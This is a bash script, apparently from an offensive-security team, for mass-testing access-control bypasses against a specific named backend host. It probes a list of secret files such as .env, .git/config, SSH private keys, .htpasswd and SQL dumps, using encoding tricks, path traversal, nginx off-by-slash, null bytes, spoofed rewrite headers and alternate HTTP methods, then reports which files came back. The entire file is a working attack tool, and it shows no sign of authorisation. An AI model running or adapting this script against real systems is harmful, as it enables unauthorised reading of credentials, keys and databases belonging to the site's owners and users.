#!/bin/bash
# Backend 403 Bypass Mass Testing
# Target: https://bkd.redahub.cloud
# Author: Neural-OffSec-Team

BACKEND="https://bkd.redahub.cloud"
OUTPUT_DIR="/tmp/403-bypass-results"
mkdir -p "$OUTPUT_DIR"

echo "[*] Backend 403 Bypass Mass Testing"
echo "[*] Target: $BACKEND"
echo "=================================="

# Lista de arquivos sensíveis para testar
SENSITIVE_FILES=(
    ".env"
    ".env.local"
    ".env.production"
    ".git/config"
    ".git/HEAD"
    "settings.py"
    "settings/production.py"
    "config.py"
    "docker-compose.yml"
    "requirements.txt"
    "package.json"
    "Dockerfile"
    ".dockerignore"
    "manage.py"
    "wsgi.py"
    "asgi.py"
    "gunicorn.conf.py"
    "uwsgi.ini"
    ".gitlab-ci.yml"
    ".github/workflows/deploy.yml"
    "database.sqlite3"
    "db.sqlite3"
    ".htaccess"
    ".htpasswd"
    "nginx.conf"
    "supervisord.conf"
    "secrets.json"
    "credentials.json"
    "id_rsa"
    "id_rsa.pub"
    ".ssh/id_rsa"
    "backup.sql"
    "dump.sql"
)

# Técnicas de bypass
test_file_with_bypasses() {
    local file="$1"
    local output_file="$OUTPUT_DIR/$(echo $file | tr '/' '_').txt"

    echo "[+] Testando: $file"
    echo "File: $file" > "$output_file"
    echo "=====================" >> "$output_file"

    # 1. Direto
    echo -n "  [1] Direct: "
    code=$(curl -skL -w "%{http_code}" -o /dev/null "$BACKEND/$file")
    echo "$code" | tee -a "$output_file"

    # 2. Double URL encoding
    encoded=$(echo "$file" | sed 's/\./%252e/g')
    echo -n "  [2] Double encode: "
    code=$(curl -skL -w "%{http_code}" -o /dev/null "$BACKEND/$encoded")
    echo "$code" | tee -a "$output_file"

    # 3. Path traversal
    echo -n "  [3] Path traversal: "
    code=$(curl -skL -w "%{http_code}" -o /dev/null "$BACKEND/./$file")
    echo "$code" | tee -a "$output_file"

    # 4. Trailing slash
    echo -n "  [4] Trailing slash: "
    code=$(curl -skL -w "%{http_code}" -o /dev/null "$BACKEND/$file/")
    echo "$code" | tee -a "$output_file"

    # 5. Case manipulation
    upper=$(echo "$file" | tr '[:lower:]' '[:upper:]')
    echo -n "  [5] Uppercase: "
    code=$(curl -skL -w "%{http_code}" -o /dev/null "$BACKEND/$upper")
    echo "$code" | tee -a "$output_file"

    # 6. Nginx off-by-slash
    echo -n "  [6] Off-by-slash: "
    code=$(curl -skL -w "%{http_code}" -o /dev/null "$BACKEND//$file")
    echo "$code" | tee -a "$output_file"

    # 7. URL encoded slash
    encoded_slash=$(echo "$file" | sed 's/\//%2f/g')
    echo -n "  [7] Encoded slash: "
    code=$(curl -skL -w "%{http_code}" -o /dev/null "$BACKEND/$encoded_slash")
    echo "$code" | tee -a "$output_file"

    # 8. Null byte (nginx < 0.8.41)
    echo -n "  [8] Null byte: "
    code=$(curl -skL -w "%{http_code}" -o /dev/null "$BACKEND/$file%00")
    echo "$code" | tee -a "$output_file"

    # 9. Unicode normalization
    echo -n "  [9] Unicode: "
    code=$(curl -skL -w "%{http_code}" -o /dev/null "$BACKEND/%2e%2e%2f$file")
    echo "$code" | tee -a "$output_file"

    # 10-15. Header manipulation
    echo -n "  [10] X-Original-URL: "
    code=$(curl -skL -w "%{http_code}" -o /dev/null -H "X-Original-URL: /$file" "$BACKEND/")
    echo "$code" | tee -a "$output_file"

    echo -n "  [11] X-Rewrite-URL: "
    code=$(curl -skL -w "%{http_code}" -o /dev/null -H "X-Rewrite-URL: /$file" "$BACKEND/")
    echo "$code" | tee -a "$output_file"

    echo -n "  [12] X-Forwarded-Path: "
    code=$(curl -skL -w "%{http_code}" -o /dev/null -H "X-Forwarded-Path: /$file" "$BACKEND/")
    echo "$code" | tee -a "$output_file"

    echo -n "  [13] X-Original-URI: "
    code=$(curl -skL -w "%{http_code}" -o /dev/null -H "X-Original-URI: /$file" "$BACKEND/")
    echo "$code" | tee -a "$output_file"

    echo -n "  [14] Referer bypass: "
    code=$(curl -skL -w "%{http_code}" -o /dev/null -H "Referer: $BACKEND/$file" "$BACKEND/")
    echo "$code" | tee -a "$output_file"

    # 16. HTTP methods
    for method in POST PUT DELETE PATCH OPTIONS TRACE; do
        echo -n "  [15] Method $method: "
        code=$(curl -skL -w "%{http_code}" -o /dev/null -X "$method" "$BACKEND/$file")
        echo "$code" | tee -a "$output_file"
    done

    echo ""
}

# Testar todos os arquivos
for file in "${SENSITIVE_FILES[@]}"; do
    test_file_with_bypasses "$file"
done

# Análise de resultados
echo ""
echo "[*] Analisando resultados..."
echo "=================================="

echo "[+] Arquivos com HTTP 200 (SUCESSO):"
grep -r "200" "$OUTPUT_DIR" | grep -v "Direct: 200" | cut -d: -f1 | sort -u | while read file; do
    basename "$file" .txt | tr '_' '/'
done

echo ""
echo "[+] Arquivos com HTTP 403 (bloqueados mas existem):"
find "$OUTPUT_DIR" -name "*.txt" -exec grep -l "403" {} \; | while read file; do
    basename "$file" .txt | tr '_' '/'
done

echo ""
echo "[*] Resultados salvos em: $OUTPUT_DIR"
